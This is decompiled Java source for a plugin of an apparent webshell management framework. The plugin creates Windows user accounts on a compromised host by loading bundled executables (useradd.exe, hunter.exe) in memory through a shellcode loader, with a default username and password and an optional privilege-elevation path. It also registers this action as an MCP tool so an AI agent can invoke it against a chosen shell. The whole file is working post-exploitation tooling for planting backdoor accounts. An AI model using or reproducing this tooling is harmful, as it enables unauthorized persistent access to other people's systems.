//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.generic;

import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import core.annotation.McpTool;
import core.annotation.McpParam;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.util.Map;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;

public abstract class Useradd implements Plugin {
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JLabel argsLabel = new JLabel("user:");
    private final JTextField argsTextField = new JTextField("qaxnb123 qaxnb123");
    private final JButton runButton = new JButton("Add1");

    private final JButton runButton1 = new JButton("Add2");

    private final JSplitPane splitPane = new JSplitPane();
    private final RTextArea resultTextArea = new RTextArea();
    private boolean loadState;
    protected ShellEntity shellEntity;
    protected Payload payload;
    private Encoding encoding;
    private ShellcodeLoader loader;

    public Useradd() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.argsLabel);
        topPanel.add(this.argsTextField);
        topPanel.add(this.runButton);
        topPanel.add(this.runButton1);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                Useradd.this.splitPane.setDividerLocation(0.15D);
            }
        });
        this.panel.add(this.splitPane);
    }

    private void runButtonClick(ActionEvent actionEvent) {
        if (this.loader == null) {
            this.loader = this.getShellcodeLoader();
        }
        if (this.loader == null) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
        } else {
            byte[] pe = functions.readInputStreamAutoClose(Useradd.class.getResourceAsStream("assets/useradd.exe"));
            try {
                byte[] result = TH_TOOLS.runPePreferThTools(this.shellEntity, this.loader, this.argsTextField.getText().trim(), pe, 6000, this.resultTextArea.getPrintStream());
                this.resultTextArea.setText(this.encoding.Decoding(result));
            } catch (Exception var4) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), var4.getMessage());
            }
        }
    }

    private void runButton1Click(ActionEvent actionEvent) {
        if (this.loader == null) {
            this.loader = this.getShellcodeLoader();
        }
        if (this.loader == null) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
        } else {
            byte[] pe = functions.readInputStreamAutoClose(Useradd.class.getResourceAsStream("assets/hunter.exe"));
            try {
                byte[] result = TH_TOOLS.isGlobalElevateEnabled(this.shellEntity) ? TH_TOOLS.runPePreferThTools(this.shellEntity, this.loader, "adduser " + this.argsTextField.getText().trim(), pe, 6000, this.resultTextArea.getPrintStream()) : this.loader.runNetPe("adduser " + this.argsTextField.getText().trim(), pe);
                this.resultTextArea.setText(this.encoding.Decoding(result));
            } catch (Exception var4) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), var4.getMessage());
            }
        }
    }


    @McpTool(name = "adduser", desc = "添加 Windows 用户: add1 走 useradd.exe, add2 走 hunter.exe", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
            @McpParam(name = "user", required = true, desc = "用户名与密码, 如: test pass123"),
            @McpParam(name = "mode", defaultValue = "add1", desc = "add1=useradd.exe / add2=hunter.exe") })
    public String mcpAddUser(Map<String, Object> args) {
        String user = (String) args.get("user");
        String mode = String.valueOf(args.getOrDefault("mode", "add1"));
        if (user == null || user.trim().isEmpty()) return "缺少参数: user";
        if (this.loader == null) {
            if (this.shellEntity != null && this.shellEntity.getFrame() != null) {
                this.loader = this.getShellcodeLoader();
            }
            if (this.loader == null) {
                this.loader = this.createLoader();
            }
        }
        if (this.loader == null) return "未找到 ShellcodeLoader";
        try {
            byte[] pe;
            byte[] result;
            PrintStream sink = new PrintStream(new ByteArrayOutputStream());
            if ("add2".equalsIgnoreCase(mode)) {
                pe = functions.readInputStreamAutoClose(Useradd.class.getResourceAsStream("assets/hunter.exe"));
                result = TH_TOOLS.isGlobalElevateEnabled(this.shellEntity)
                        ? TH_TOOLS.runPePreferThTools(this.shellEntity, this.loader, "adduser " + user, pe, 6000, sink)
                        : this.loader.runNetPe("adduser " + user, pe);
            } else {
                pe = functions.readInputStreamAutoClose(Useradd.class.getResourceAsStream("assets/useradd.exe"));
                result = TH_TOOLS.runPePreferThTools(this.shellEntity, this.loader, user, pe, 6000, sink);
            }
            return this.encoding.Decoding(result);
        } catch (Exception e) {
            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
        }
    }

    protected ShellcodeLoader createLoader() {
        return null;
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(Useradd.class, this, Useradd.class, this);
    }

    public JPanel getView() {
        return this.panel;
    }

    protected abstract ShellcodeLoader getShellcodeLoader();
}
